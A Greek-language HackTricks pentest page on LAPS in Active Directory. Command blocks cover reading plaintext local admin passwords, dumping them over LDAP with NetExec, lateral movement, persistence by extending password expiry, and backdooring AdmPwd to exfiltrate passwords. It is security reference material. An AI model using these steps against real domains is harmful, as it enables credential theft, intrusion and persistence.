# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Υπάρχουν αυτήν τη στιγμή **2 εκδόσεις του LAPS** που μπορεί να συναντήσετε κατά τη διάρκεια ενός assessment:

- **Legacy Microsoft LAPS**: αποθηκεύει τον κωδικό πρόσβασης του local administrator στο **`ms-Mcs-AdmPwd`** και τον χρόνο λήξης στο **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (ενσωματωμένο στα Windows από τις ενημερώσεις του Απριλίου 2023): μπορεί ακόμη να προσομοιώνει το legacy mode, αλλά στο native mode χρησιμοποιεί τα attributes **`msLAPS-*`**, υποστηρίζει **κρυπτογράφηση κωδικών πρόσβασης**, **ιστορικό κωδικών πρόσβασης** και **backup του κωδικού DSRM** για domain controllers.

Το LAPS έχει σχεδιαστεί για τη διαχείριση των **κωδικών πρόσβασης των local administrators**, καθιστώντας τους **μοναδικούς, τυχαιοποιημένους και συχνά μεταβαλλόμενους** σε υπολογιστές ενταγμένους σε domain. Αν μπορείτε να διαβάσετε αυτά τα attributes, συνήθως μπορείτε να κάνετε **pivot ως local admin** στον επηρεαζόμενο host. Σε πολλά περιβάλλοντα, το ενδιαφέρον δεν περιορίζεται μόνο στην ανάγνωση του ίδιου του κωδικού πρόσβασης, αλλά και στην εύρεση του **ποιοι έχουν delegated access** στα attributes των κωδικών πρόσβασης.

### Legacy Microsoft LAPS attributes

Στα computer objects του domain, η υλοποίηση του legacy Microsoft LAPS έχει ως αποτέλεσμα την προσθήκη δύο attributes:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **κωδικός πρόσβασης administrator σε plain text**
- **`ms-Mcs-AdmPwdExpirationTime`**: **χρόνος λήξης του κωδικού πρόσβασης**

### Windows LAPS attributes

Το native Windows LAPS προσθέτει αρκετά νέα attributes στα computer objects:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: blob κωδικού πρόσβασης σε clear text, αποθηκευμένο ως JSON όταν η κρυπτογράφηση δεν είναι ενεργοποιημένη
- **`msLAPS-PasswordExpirationTime`**: προγραμματισμένος χρόνος λήξης
- **`msLAPS-EncryptedPassword`**: κρυπτογραφημένος τρέχων κωδικός πρόσβασης
- **`msLAPS-EncryptedPasswordHistory`**: κρυπτογραφημένο ιστορικό κωδικών πρόσβασης
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: κρυπτογραφημένα δεδομένα κωδικού πρόσβασης DSRM για domain controllers
- **`msLAPS-CurrentPasswordVersion`**: παρακολούθηση έκδοσης βάσει GUID, που χρησιμοποιείται από τη νεότερη λογική ανίχνευσης rollback (schema forest του Windows Server 2025)

Όταν το **`msLAPS-Password`** είναι αναγνώσιμο, η τιμή είναι ένα αντικείμενο JSON που περιέχει το όνομα του account, τον χρόνο ενημέρωσης και τον κωδικό πρόσβασης σε clear text, για παράδειγμα:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Έλεγχος αν είναι ενεργοποιημένο
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Πρόσβαση σε κωδικούς LAPS

Μπορείτε να **κατεβάσετε την raw LAPS policy** από το `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` και στη συνέχεια να χρησιμοποιήσετε το **`Parse-PolFile`** από το πακέτο [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) για να μετατρέψετε αυτό το αρχείο σε μορφή αναγνώσιμη από τον άνθρωπο.

### Legacy Microsoft LAPS PowerShell cmdlets

Αν το legacy LAPS module είναι εγκατεστημένο, τα ακόλουθα cmdlets είναι συνήθως διαθέσιμα:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Το Native Windows LAPS περιλαμβάνει ένα νέο PowerShell module και νέα cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Μερικές λειτουργικές λεπτομέρειες έχουν σημασία εδώ:<sup>[[3]](#references)</sup>

- Το **`Get-LapsADPassword`** διαχειρίζεται αυτόματα τα **legacy LAPS**, το **clear-text Windows LAPS** και το **encrypted Windows LAPS**.
- Αν το password είναι encrypted και μπορείτε να το **διαβάσετε** αλλά όχι να το **αποκρυπτογραφήσετε**, το cmdlet επιστρέφει metadata όπως **`Source`**, **`DecryptionStatus`** και **`AuthorizedDecryptor`**, ακόμη και όταν δεν μπορεί να επιστρέψει το clear-text password.
- Στο **encrypted Windows LAPS**, το **read permission** και το **decrypt permission** είναι **διαφορετικοί έλεγχοι**. Η ύπαρξη read access στο OU / object δεν σημαίνει αυτόματα ότι μπορείτε να αποκρυπτογραφήσετε το **`msLAPS-EncryptedPassword`**.
- Το **password history** είναι διαθέσιμο μόνο όταν είναι ενεργοποιημένο το **Windows LAPS encryption**.
- Σε domain controllers, το source που επιστρέφεται μπορεί να είναι **`EncryptedDSRMPassword`**.

Αυτό είναι χρήσιμο κατά τη διάρκεια ενός assessment, επειδή το πεδίο **`AuthorizedDecryptor`** σας ενημερώνει **για ποιον user ή group κρυπτογραφήθηκε το blob**, μετατρέποντας συχνά ένα αποτυχημένο password read σε νέο privilege-escalation target.

### PowerView / LDAP

Το **PowerView** μπορεί επίσης να χρησιμοποιηθεί για να βρείτε **ποιος μπορεί να διαβάσει το password και να το διαβάσει**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Εάν το **`msLAPS-Password`** είναι αναγνώσιμο, αναλύστε το JSON που επιστράφηκε και εξαγάγετε το **`p`** για τον κωδικό πρόσβασης και το **`n`** για το όνομα του managed local admin account.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Αυτό το πεδίο **`n`** είναι σημαντικό σε νεότερες εγκαταστάσεις, επειδή το **Windows LAPS automatic account management** μπορεί να στοχεύσει έναν **custom account** αντί για τον ενσωματωμένο **`Administrator`**, ενώ τα νεότερα συστήματα **Windows 11 24H2 / Windows Server 2025** μπορούν ακόμη και να **randomize** το όνομα αυτού του account.<sup>[[4]](#references)</sup>

### Linux / απομακρυσμένα εργαλεία

Τα σύγχρονα εργαλεία υποστηρίζουν τόσο το legacy Microsoft LAPS όσο και το Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Σημειώσεις:

- Οι πρόσφατες εκδόσεις του **NetExec** υποστηρίζουν τα **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** και **`msLAPS-EncryptedPassword`**.
- Το **`pyLAPS`** παραμένει χρήσιμο για το **legacy Microsoft LAPS** από Linux, αλλά στοχεύει μόνο το **`ms-Mcs-AdmPwd`**.
- Νεότερα cross-platform εργαλεία, όπως τα **`LAPS4LINUX`**, εργαλεία που βασίζονται στο **`dpapi-ng`** και πρόσφατα **NetExec** workflows, μπορούν επίσης να χειριστούν το **native Windows LAPS** από non-Windows hosts.
- Αν το περιβάλλον χρησιμοποιεί **encrypted Windows LAPS**, ένα απλό LDAP read δεν αρκεί. Πρέπει επίσης να είστε **authorized decryptor** (ή να διαθέτετε αντίστοιχο υλικό αποκρυπτογράφησης, όπως offline domain DPAPI-NG root key material).<sup>[[5]](#references)</sup>
- Στα **Windows 11 24H2 / Windows Server 2025**, μην υποθέτετε ότι ο managed local admin είναι πάντα ο **`Administrator`**. Το automatic account management μπορεί να δημιουργήσει custom account και προαιρετικά να κάνει randomize το όνομά του, επομένως πρώτα εντοπίστε το όνομα του account μέσω των **`n`** / **`Account`**, πριν χρησιμοποιήσετε το **`--laps`** σε scale.<sup>[[4]](#references)</sup>

### Abuse directory synchronization

Αν έχετε δικαιώματα **directory synchronization** σε επίπεδο domain, αντί για άμεση read access σε κάθε computer object, το LAPS μπορεί και πάλι να παρουσιάζει ενδιαφέρον.

Ο συνδυασμός των **`DS-Replication-Get-Changes`** με τα **`DS-Replication-Get-Changes-In-Filtered-Set`** ή **`DS-Replication-Get-Changes-All`** μπορεί να χρησιμοποιηθεί για τον συγχρονισμό **confidential / RODC-filtered** attributes, όπως το legacy **`ms-Mcs-AdmPwd`**. Το BloodHound το μοντελοποιεί ως **`SyncLAPSPassword`**. Δείτε το [DCSync](dcsync.md) για το background των replication rights.

## LAPSToolkit

Το [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) διευκολύνει το enumeration του LAPS μέσω αρκετών functions.<sup>[[6]](#references)</sup>\
Μία από αυτές είναι το parsing των **`ExtendedRights`** για **όλους τους computers με ενεργοποιημένο LAPS.** Αυτό εμφανίζει τα **groups** που έχουν συγκεκριμένα **delegated access για read των LAPS passwords**, τα οποία είναι συχνά users σε protected groups.\
Ένα **account** που έχει κάνει **join έναν computer** σε ένα domain λαμβάνει `All Extended Rights` πάνω σε αυτόν τον host, και αυτό το right παρέχει στο **account** τη δυνατότητα να **διαβάζει passwords**. Το enumeration μπορεί να εμφανίσει ένα user account που μπορεί να διαβάσει το LAPS password σε έναν host. Αυτό μπορεί να μας βοηθήσει να **στοχεύσουμε συγκεκριμένους AD users** που μπορούν να διαβάσουν LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Εξαγωγή κωδικών LAPS με NetExec / CrackMapExec

Αν δεν έχετε interactive PowerShell, μπορείτε να εκμεταλλευτείτε αυτό το privilege απομακρυσμένα μέσω LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Αυτό κάνει dump όλων των LAPS secrets που μπορεί να διαβάσει ο χρήστης, επιτρέποντάς σας να πραγματοποιήσετε lateral movement με διαφορετικό κωδικό πρόσβασης τοπικού administrator.

## Χρήση κωδικού πρόσβασης LAPS
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistence του LAPS

### Ημερομηνία λήξης

Μόλις αποκτήσετε admin, είναι δυνατό να **αποκτήσετε τους κωδικούς πρόσβασης** και να **εμποδίσετε** ένα μηχάνημα να **ενημερώσει** τον **κωδικό πρόσβασής** του, **ορίζοντας την ημερομηνία λήξης στο μέλλον**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Το εγγενές Windows LAPS χρησιμοποιεί **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Ο κωδικός πρόσβασης θα συνεχίσει να αλλάζει αν ένας **admin** χρησιμοποιήσει τα **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ή αν είναι ενεργοποιημένη η ρύθμιση **Να μην επιτρέπεται χρόνος λήξης κωδικού πρόσβασης μεγαλύτερος από αυτόν που απαιτείται από την πολιτική**.

### Περιορισμός επαναφοράς snapshot σε νεότερα Windows LAPS

Τα παλαιότερα τεχνάσματα επαναφοράς snapshot / image είναι **λιγότερο αξιόπιστα** απέναντι σε πρόσφατες αναπτύξεις **Windows LAPS**. Σε **Windows 11 24H2 / Windows Server 2025**, αν το σχήμα του forest περιλαμβάνει το **`msLAPS-CurrentPasswordVersion`** (**σχήμα forest του Windows Server 2025**), ο client συγκρίνει ένα GUID που έχει αποθηκευτεί τοπικά στη cache με την τιμή που είναι αποθηκευμένη στο AD και **αλλάζει αμέσως τον κωδικό πρόσβασης** όταν μια επαναφορά δημιουργεί μια **ασυνεπή κατάσταση**.

Στην πράξη, αυτό σημαίνει ότι η persistence μέσω snapshot ή οι προσπάθειες επαναφοράς ενός παλαιότερου γνωστού κωδικού πρόσβασης τοπικού admin μπορούν να ακυρωθούν γρήγορα, αντί να παραμείνουν μέχρι την επόμενη κανονική λήξη.<sup>[[2]](#references)</sup>

Αυτή η προστασία ισχύει μόνο για το **Windows LAPS που βασίζεται στο AD** και εξακολουθεί να εξαρτάται από το αν το μηχάνημα που επανήλθε μπορεί να **κάνει authenticate ξανά στο AD**. Αν το μηχάνημα δεν μπορεί πλέον να επικοινωνήσει με το AD, το **ιστορικό κωδικών πρόσβασης** ή η **πρόσβαση σε αντίγραφα ασφαλείας του AD** μπορεί να αποδειχθούν σωτήρια.

### Περιορισμός παραποίησης της αυτόματης διαχείρισης λογαριασμού

Όταν είναι ενεργοποιημένη η **automatic account management**, το Windows LAPS διαχειρίζεται τον κύκλο ζωής του υπό διαχείριση τοπικού admin account. Μη αναμενόμενες προσπάθειες μετονομασίας, επαναδιαμόρφωσης ή άλλης παραποίησης αυτού του account μπορούν να απορριφθούν με **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, επομένως η persistence που βασίζεται στη σιωπηλή τροποποίηση του managed LAPS account είναι λιγότερο αξιόπιστη σε νεότερα endpoints.<sup>[[4]](#references)</sup>

### Ανάκτηση ιστορικών κωδικών πρόσβασης από αντίγραφα ασφαλείας του AD

Όταν είναι ενεργοποιημένα τα **Windows LAPS encryption + password history**, τα προσαρτημένα αντίγραφα ασφαλείας του AD μπορούν να αποτελέσουν πρόσθετη πηγή secrets. Αν μπορείτε να αποκτήσετε πρόσβαση σε ένα προσαρτημένο AD snapshot και να χρησιμοποιήσετε το **recovery mode**, μπορείτε να αναζητήσετε παλαιότερους αποθηκευμένους κωδικούς πρόσβασης χωρίς να επικοινωνήσετε με ενεργό DC.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Αυτό είναι κυρίως σχετικό κατά την **κλοπή αντιγράφων ασφαλείας του AD**, την **κατάχρηση offline forensics** ή την **πρόσβαση σε μέσα disaster recovery**.

### Backdoor

Ο αρχικός πηγαίος κώδικας για το legacy Microsoft LAPS βρίσκεται [εδώ](https://github.com/GreyCorbel/admpwd), επομένως είναι δυνατό να τοποθετηθεί ένα backdoor στον κώδικα (για παράδειγμα, μέσα στη μέθοδο `Get-AdmPwdPassword` στο `Main/AdmPwd.PS/Main.cs`) που θα **κάνει exfiltrate τους νέους κωδικούς πρόσβασης ή θα τους αποθηκεύει κάπου**.

Στη συνέχεια, κάντε compile το νέο `AdmPwd.PS.dll` και ανεβάστε το στο μηχάνημα στη διαδρομή `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (και αλλάξτε τον χρόνο τροποποίησης).

## Αναφορές

- [1] [Εισαγωγή στο Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Επεκτάσεις schema και δικαιωμάτων του Windows LAPS για το Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Ξεκινήστε με το Windows LAPS και το Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Λειτουργίες διαχείρισης λογαριασμών του Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
